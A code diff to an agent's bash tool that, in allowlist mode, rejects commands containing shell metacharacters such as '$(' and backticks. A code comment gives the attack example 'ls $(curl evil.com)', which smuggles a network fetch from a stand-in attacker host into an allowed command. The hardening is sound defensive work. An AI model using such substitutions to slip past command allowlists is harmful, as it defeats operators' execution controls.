@@ -113,6 +113,13 @@ func (t *BashTool) Execute(ctx context.Context, input json.RawMessage) (ToolResu
 		case "deny":
 			return ToolResult{Error: "bash execution is disabled by policy"}, nil
 		case "allowlist":
+			// Block shell metacharacters that can execute arbitrary code
+			// inside an otherwise-allowed command (e.g. ls $(curl evil.com))
+			for _, meta := range []string{"$(", "`", "<(", ">(", "${", "\\n"} {
+				if strings.Contains(in.Command, meta) {
+					return ToolResult{Error: "command contains shell metacharacters not allowed in allowlist mode"}, nil
+				}
+			}
 			cmds := extractCommands(in.Command)
 			allowed := make(map[string]bool, len(t.ExecPolicy.Allowlist))
 			for _, a := range t.ExecPolicy.Allowlist {
